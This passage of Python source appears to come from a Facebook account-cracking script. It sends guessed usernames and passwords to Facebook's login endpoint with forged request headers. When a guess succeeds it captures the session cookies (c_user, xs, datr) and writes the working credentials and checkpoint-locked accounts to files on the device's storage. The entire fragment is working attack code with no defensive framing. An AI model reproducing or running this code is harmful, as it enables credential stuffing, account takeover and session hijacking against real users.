                cuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                head = ({"sec-fetch-site": "same-origin", "origin": "https://"+re.findall("https://(.*?)/", urll)[0], "accept": "*/*", "cookie": f"{cuki}", "content-type": "application/x-www-form-urlencoded", "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "referer": urll, "content-length": str(len((data))), "user-agent": uas})
                xnxx = ses.post(post, data=data, headers=head, allow_redirects=True)
                if "c_user" in ses.cookies.get_dict():
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    print('\r\r\033[1;32m [OK] '+username+' | '+password+' | '+coki+'\033[1;97m')
                    kntl = (f"[✓] {username}|{password}")
                    self.ok.append(kntl)
                    open('/sdcard/cil-OK.txt','a').write(kntl+'\n')
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    print(f'\r\r{M} [CP] '+username+' | '+password+'\033[1;97m')
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    open('/sdcard/cil-CP.txt','a').write(kntl+'\n')
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                time.sleep(5)
            except Exception as e:
                pass
        self.loop+=1

security()